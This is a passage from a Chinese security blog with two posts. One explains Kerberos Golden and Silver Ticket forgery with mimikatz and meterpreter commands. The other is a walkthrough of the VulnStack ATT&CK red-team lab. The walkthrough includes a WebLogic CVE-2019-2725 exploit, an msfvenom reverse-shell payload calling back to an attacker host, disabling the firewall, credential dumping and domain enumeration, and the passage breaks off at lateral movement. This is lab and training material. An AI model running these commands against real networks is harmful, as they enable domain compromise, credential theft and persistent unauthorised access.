href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%8C%85?fromModule=lemma_inlink">数据包</a>可以被任意地读取、修改和插入数据。</p><p><img src="/2023/08/10/PTH-PTT/image-20230808145800119.png" alt="image-20230808145800119"></p><p>简要大概地说一下Kerberos是如何工作的：</p><pre class="line-numbers language-none"><code class="language-none">1. 假设你要在一台电脑上访问另一个服务器（你可以发送telnet或类似的登录请求）。你知道服务器要接受你的请求必须要有一张Kerberos的“入场券”。2. 要得到这张入场券，你首先要向验证服务器（AS）请求验证。验证服务器会创建基于你的密码（从你的用户名而来）的一个“会话密钥”（就是一个加密密钥），并产生一个代表请求的服务的随机值。这个会话密钥就是“允许入场的入场券”。3. 然后，你把这张允许入场的入场券发到授权服务器（TGS）。TGS物理上可以和验证服务器是同一个服务器，只不过它现在执行的是另一个服务。TGS返回一张可以发送给请求服务的服务器的票据。4. 服务器或者拒绝这张票据，或者接受这张票据并执行服务。5. 因为你从TGS收到的这张票据是打上时间戳的，所以它允许你在某个特定时期内（一般是八小时）不用再验证就可以使用同一张票来发出附加的请求。使这张票拥有一个有限的有效期使其以后不太可能被其他人使用。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>协议的安全主要依赖于参加者对时间的松散同步和短周期的叫做Kerberos票据的认证声明。 下面是对这个协议的一个简化描述，将使用以下缩写：</p><pre class="line-numbers language-none"><code class="language-none">AS（Authentication Server）&#x3D; 认证服务器KDC（Key Distribution Center）&#x3D; 密钥分发中心TGT（Ticket Granting Ticket）&#x3D; 票据授权票据，票据的票据TGS（Ticket Granting Server）&#x3D; 票据授权服务器SS（Service Server）&#x3D; 特定服务提供端<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>客户端用户发送自己的用户名到KDC服务器以向AS服务进行认证。KDC服务器会生成相应的TGT票据，打上时间戳，在本地数据库中查找该用户的密码，并用该密码对TGT进行加密，将结果发还给客户端用户。该操作仅在用户登录或者kinit申请的时候进行。 客户端收到该信息，并使用自己的密码进行解密之后，就能得到TGT票据了。这个TGT会在一段时间之后失效，也有一些程序(session manager)能在用户登陆期间进行自动更新。 当客户端用户需要使用一些特定服务(Kerberos术语中用”principal”表示)的时候，该客户端就发送TGT到KDC服务器中的TGS服务。当该用户的TGT验证通过并且其有权访问所申请的服务时，TGS服务会生成一个该服务所对应的ticket和session key，并发还给客户端。客户端将服务请求与该ticket一并发送给相应的服务端即可。具体的流程请看下面的描述。</p><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><ul><li>需要与DC通信</li><li>需要krbtgt用户的Hash(KDC Hash)</li></ul><p>域中有一个特殊用户叫做krbtgt，该用户是用于Kerberos身份验证的帐户，获得了该用户的hash，就可以伪造票据进行票据传递</p><p>域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的，因此只要获取到krbtgt的密码Hash，就可以随意伪造Ticket，进而使用Ticket登陆域控制器，使用krbtgt用户hash生成的票据被称为Golden Ticket。</p><h4 id="获取krbtgt用户哈希"><a href="#获取krbtgt用户哈希" class="headerlink" title="获取krbtgt用户哈希"></a>获取krbtgt用户哈希</h4><ul><li>DCSync (mimikatz)</li></ul><p>mimikatz 会模拟域控，向目标域控请求账号密码信息。 这种方式动静更小，不用直接登陆域控，也不需要提取NTDS.DIT文件。需要域管理员或者其他类似的高权限账户。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lsadump::dcsync /user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/10/PTH-PTT/image-20230808155305370.png" alt="image-20230808155305370"></p><p><img src="/2023/08/10/PTH-PTT/image-20230808155326272.png" alt="image-20230808155326272"></p><p>或者在 meterpreter 中使用 kiwi 扩展</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dcsync_ntlm krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/10/PTH-PTT/image-20230808161546974.png" alt="image-20230808161546974"></p><ul><li>LSA(mimikatz)</li></ul><p>mimikatz 可以在域控的本地安全认证(Local Security Authority)上直接读取</p><pre class="line-numbers language-none"><code class="language-none">privilege::debuglsadump::lsa &#x2F;inject &#x2F;name:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>Hashdump(Meterpreter）</li></ul><pre class="line-numbers language-none"><code class="language-none">hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/10/PTH-PTT/image-20230808164517593.png" alt="image-20230808164517593"></p><h4 id="伪造黄金票据"><a href="#伪造黄金票据" class="headerlink" title="伪造黄金票据"></a>伪造黄金票据</h4><h5 id="使用meterpreter中的kiwi模块"><a href="#使用meterpreter中的kiwi模块" class="headerlink" title="使用meterpreter中的kiwi模块"></a>使用meterpreter中的kiwi模块</h5><pre class="line-numbers language-none"><code class="language-none">load kiwi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">golden_ticket_create <span class="token parameter variable">-d</span> <span class="token operator">&lt;</span>域名<span class="token operator">></span> <span class="token parameter variable">-u</span> <span class="token operator">&lt;</span>任意用户名<span class="token operator">></span> <span class="token parameter variable">-s</span> <span class="token operator">&lt;</span>Domain SID<span class="token operator">></span> <span class="token parameter variable">-k</span> <span class="token operator">&lt;</span>krbtgt NTLM Hash<span class="token operator">></span> <span class="token parameter variable">-t</span> <span class="token operator">&lt;</span>ticket本地存储路径如:/tmp/krbtgt.ticket<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">golden_ticket_create <span class="token parameter variable">-d</span> de1ay.com <span class="token parameter variable">-u</span> <span class="token builtin class-name">test</span> <span class="token parameter variable">-s</span> S-1-5-21-2756371121-2868759905-3853650604 <span class="token parameter variable">-k</span> 82dfc71b72a11ef37d663047bc2088fb <span class="token parameter variable">-t</span> /tmp/krbtgt.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/10/PTH-PTT/image-20230808164952929.png" alt="image-20230808164952929"></p><p>把伪造的票据注入到内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos_ticket_use &#x2F;tmp&#x2F;krbtgt.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就访问到域内其他机器的文件了</p><p><img src="/2023/08/10/PTH-PTT/image-20230808165850440.png" alt="image-20230808165850440"></p><p><img src="/2023/08/10/PTH-PTT/image-20230809092817045.png" alt="image-20230809092817045"></p><h5 id="使用mimikatz"><a href="#使用mimikatz" class="headerlink" title="使用mimikatz"></a>使用mimikatz</h5><p>使用mimikatz伪造黄金票据</p><p>进入mimikatz交互页面,然后先查看当前票据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kerberos::list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看之后如果有票据的话可以先给他清空</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后利用前面获取到的krbtgt的哈希值</p><p>来生成黄金票据，并注入内存</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kerberos::golden /admin:Administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>传递票据并注入内存</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kerberos::ptt Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据不与密钥分发中心 KDC 交互，因此没有了 Kerberos 认证协议里的前 4 步，通过伪造的票据授予服务 TGS 生成伪造的服务票据 ST 直接与服务器 Server 进行交互。</p><p>特点:</p><ul><li>无需与KDC交互</li><li>需要目标Server的NTLM Hash</li></ul><h4 id="获取sever-HASH"><a href="#获取sever-HASH" class="headerlink" title="获取sever HASH"></a>获取sever HASH</h4><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;privilege::debug” &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="伪造-CIFS-服务权限"><a href="#伪造-CIFS-服务权限" class="headerlink" title="伪造 CIFS 服务权限"></a>伪造 CIFS 服务权限</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kerberos::list <span class="token comment">#列出票据</span>kerberos::purge <span class="token comment"># 清除票据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>伪造票据</p><pre class="line-numbers language-none"><code class="language-none">mimikatz “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:&lt;NTLM Hash&gt; &#x2F;user:&lt;用户名&gt; &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="伪造-LDAP-服务权限"><a href="#伪造-LDAP-服务权限" class="headerlink" title="伪造 LDAP 服务权限"></a>伪造 LDAP 服务权限</h4><p>首先判断当前权限是否可以使用 dcsync 域控进行同步</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;lsadump::dcsync &#x2F;dc:dc &#x2F;domain:teamssix.com &#x2F;user:krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果返回 ERROR 说明当前权限不能进行 dcsync 操作</p><p>接下来生成 LDAP 服务的白银票据</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:ldap &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考文章：</p><p><a href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-Tickets">https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-Tickets</a></p><p><a href="https://baike.baidu.com/item/Kerberos/5561682?fr=ge_ala">https://baike.baidu.com/item/Kerberos/5561682?fr=ge_ala</a></p><p><a href="https://teamssix.com/210901-160349#toc-heading-2">https://teamssix.com/210901-160349#toc-heading-2</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PTH&amp;PTT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnStackATT&amp;CK红队实战二</title>
      <link href="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/"/>
      <url>/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p><pre class="line-numbers language-none"><code class="language-none">Bypass UACWindows系统NTLM获取（理论知识：Windows认证）Access Token利用（MSSQL利用）WMI利用网页代理，二层代理，特殊协议代理（DNS，ICMP）域内信息收集域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用域凭证收集后门技术（黄金票据&#x2F;白银票据&#x2F;Sid History&#x2F;MOF）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件下载下来解压后有三个文件夹，双击各个文件夹中的.vmx文件即可一键创建虚拟机，除了web靶机初始密码都为1qaz@WSX，WEB靶机需切换用户，用administrator管理员账号登录，没有密码，点击登录会提示更改密码，为了方便也设置成了1qaz@WSX</p><p>官方给的网络拓扑图</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/%E6%8B%93%E6%89%91%E5%9B%BE.jpg" alt="img"></p><p>配置信息</p><p><strong>DC</strong></p><pre class="line-numbers language-none"><code class="language-none">IP：10.10.10.10OS：Windows 2012(64)应用：AD域<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>WEB</strong></p><pre class="line-numbers language-none"><code class="language-none">IP1：10.10.10.80IP2：192.168.111.80OS：Windows 2008(64)应用：Weblogic 10.3.6MSSQL 2008<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>PC</strong></p><pre class="line-numbers language-none"><code class="language-none">IP1：10.10.10.201IP2：192.168.111.201OS：Windows 7(32)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>攻击机</strong></p><pre class="line-numbers language-none"><code class="language-none">IP：192.168.111.1OS：Windows 10(64)IP：192.168.111.128OS：KALI(64)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>根据IP配置虚拟机网卡</p><p>首先需要两个网卡，一个NAT，一个仅主机模式</p><p>我用的是2和5</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230802142949875.png" alt="image-20230802142949875"></p><p>右击虚拟机，点击设置-&gt;网络适配器-&gt;自定义，然后换成对应自己设置的网卡</p><p><strong>DC</strong></p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230802143411918.png" alt="image-20230802143411918"></p><p><strong>PC</strong></p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230802143458663.png" alt="image-20230802143458663"></p><p><strong>WEB</strong></p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230802143539383.png" alt="image-20230802143539383"></p><p>至此环境搭建已经完成</p><h2 id="外网渗透（攻击WEB）"><a href="#外网渗透（攻击WEB）" class="headerlink" title="外网渗透（攻击WEB）"></a>外网渗透（攻击WEB）</h2><p>WEB</p><p>IP1：10.10.10.80<br>IP2：192.168.111.80</p><p>先攻击公网IP：192.168.111.80</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>全面扫描端口、版本、脚本……</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token number">192.168</span>.111.80 <span class="token parameter variable">-T4</span> <span class="token parameter variable">-sV</span> -p-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230802153642871.png" alt="image-20230802153642871"></p><p>开放着7001weblogic端口</p><p>如果扫不到在web机器中C:\Oracle\Middleware\user_projects\domains\base_domain\bin右击startWeblogic以管理员身份运行</p><p>下载weblogic漏洞扫描工具</p><p><a href="https://github.com/0xn0ne/weblogicScanner.git">https://github.com/0xn0ne/weblogicScanner.git</a></p><p>扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python ws.py <span class="token parameter variable">-t</span> <span class="token number">192.168</span>.111.80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230802154544058.png" alt="image-20230802154544058"></p><p>发现存在很多历史漏洞</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>然后我们找这些历史漏洞的利用方式来getshell</p><p>利用工具对CVE-2019-2725进行利用</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803102247623.png" alt="image-20230803102247623"></p><p>上传jsp木马</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803102733246.png" alt="image-20230803102733246"></p><p>蚁剑连接</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803102758873.png" alt="image-20230803102758873"></p><p>成功getshell</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803103429565.png" alt="image-20230803103429565"></p><p>除此之外还可以直接通过msf搜索CVE-2019-2725，看看有没有可以利用的脚本</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230810140347176.png" alt="image-20230810140347176"></p><p>可以发现存在可利用脚本，用该脚本进行攻击</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;misc&#x2F;weblogic_deserialize_asyncresponseserviceset rhosts 192.168.111.80set lhost 192.168.111.128show targetsset target 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功拿到meterpreter</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230810163006578.png" alt="image-20230810163006578"></p><h3 id="获取主机权限"><a href="#获取主机权限" class="headerlink" title="获取主机权限"></a>获取主机权限</h3><h4 id="CS方式"><a href="#CS方式" class="headerlink" title="CS方式"></a>CS方式</h4><p>开启cs客户端和服务端</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./teamserver <span class="token number">192.168</span>.111.128 f14g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./cobaltstrike<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本地连接</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803105133612.png" alt="image-20230803105133612"></p><p>创建一个监听器</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803105649515.png" alt="image-20230803105649515"></p><p>生成一个Windows木马</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803105807153.png" alt="image-20230803105807153"></p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803105951872.png" alt="image-20230803105951872"></p><p>把木马上传至蚁剑中并执行</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803113959317.png" alt="image-20230803113959317"></p><p>靶机成功上线</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803114035866.png" alt="image-20230803114035866"></p><p>现在权限是administrator,我们可以给他提到system,选择对应的脚本</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803140416448.png" alt="image-20230803140416448"></p><p>成功提权</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803140508157.png" alt="image-20230803140508157"></p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803140540188.png" alt="image-20230803140540188"></p><p>这样就拿到主机的权限了</p><h4 id="msf方式"><a href="#msf方式" class="headerlink" title="msf方式"></a>msf方式</h4><p>getshell之后利用msf生成一个木马</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.111.128 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">5555</span> <span class="token parameter variable">-f</span> exe <span class="token operator">></span> shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后把生成的木马上传到蚁剑中</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230804100458224.png" alt="image-20230804100458224"></p><p>在kali上设置监听</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.111.128<span class="token builtin class-name">set</span> lport <span class="token number">5555</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在蚁剑上执行shell.exe</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230804100656731.png" alt="image-20230804100656731"></p><p>拿到meterpreter</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230804100750635.png" alt="image-20230804100750635"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><p>查看防火墙是否开启</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># windows server 2003及以下版本:</span>netsh firewall show config<span class="token comment"># window server 2003以上版本：</span>netsh advfirewall show allprofiles state<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shell netsh advfirewall show allprofiles state<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803141254899.png" alt="image-20230803141254899"></p><p>关闭防火墙</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Windows server <span class="token number">2003</span>及之前版本：netsh firewall <span class="token builtin class-name">set</span> opmode disable    <span class="token comment">#关闭  </span>netsh firewall <span class="token builtin class-name">set</span> opmode <span class="token builtin class-name">enable</span>     <span class="token comment">#开启</span>Windows server <span class="token number">2003</span>之后版本：netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off    <span class="token comment">#关闭    </span>netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state on     <span class="token comment">#开启</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shell netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803141423882.png" alt="image-20230803141423882"></p><p>再查看一下防火墙是否关闭</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803141534535.png" alt="image-20230803141534535"></p><h4 id="版本信息收集"><a href="#版本信息收集" class="headerlink" title="版本信息收集"></a>版本信息收集</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shell systeminfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803141854656.png" alt="image-20230803141854656"></p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803141914120.png" alt="image-20230803141914120"></p><h4 id="查看登录域"><a href="#查看登录域" class="headerlink" title="查看登录域"></a>查看登录域</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shell net config workstation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803142832986.png" alt="image-20230803142832986"></p><h4 id="获取主机杀软信息"><a href="#获取主机杀软信息" class="headerlink" title="获取主机杀软信息"></a>获取主机杀软信息</h4><p>利用的是梼杌插件，自己可以自行下载</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803150751633.png" alt="image-20230803150751633"></p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803150920070.png" alt="image-20230803150920070"></p><p>存在三种杀软</p><h4 id="查看域内机器"><a href="#查看域内机器" class="headerlink" title="查看域内机器"></a>查看域内机器</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net group <span class="token string">"domain computers"</span> /domain    <span class="token comment">#查看当前域内机器</span>net group <span class="token string">"domain controllers"</span> /domain    <span class="token comment">#查看域控</span>net group <span class="token string">"domain admins"</span> /domain  <span class="token comment">#查看域管理员用户</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803144833477.png" alt="image-20230803144833477"></p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803144925719.png" alt="image-20230803144925719"></p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803145027464.png" alt="image-20230803145027464"></p><h4 id="通过pingDC-PC获取IP地址"><a href="#通过pingDC-PC获取IP地址" class="headerlink" title="通过pingDC,PC获取IP地址"></a>通过pingDC,PC获取IP地址</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shell <span class="token function">ping</span> DC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803151640564.png" alt="image-20230803151640564"></p><p>IP:10.10.10.10</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shell <span class="token function">ping</span> PC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803151738409.png" alt="image-20230803151738409"></p><p>IP:10.10.10.201</p><h4 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h4><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803153051409.png" alt="image-20230803153051409"></p><h4 id="logonpasswords"><a href="#logonpasswords" class="headerlink" title="logonpasswords"></a>logonpasswords</h4><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803153134671.png" alt="image-20230803153134671"></p><p>根据得到的密码（而且我们扫描端口的时候发现3389端口开放着）可以使用rdesktop进行远程连接</p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230811135535516.png" alt="image-20230811135535516"></p><h2 id="横向移动（攻击DC-PC）"><a href="#横向移动（攻击DC-PC）" class="headerlink" title="横向移动（攻击DC,PC）"></a>横向移动（攻击DC,PC）</h2><h3 id="使用梼杌上传fscan"><a href="#使用梼杌上传fscan" class="headerlink" title="使用梼杌上传fscan"></a>使用梼杌上传fscan</h3><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803154118275.png" alt="image-20230803154118275"></p><p><img src="/2023/08/04/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E4%BA%8C/image-20230803154257643.png" alt="image-20230803154257643"></p><p>然后运行fscan</p><p>扫描到10.10.10.0这个网段的端口开放和一些漏洞情况</p><h3 id="SMB-beacon横向移动"><a href="#SMB-beacon横向移动" class="headerlink" title="SMB beacon横向移动"></a>SMB beacon横向移动</h3><p><img 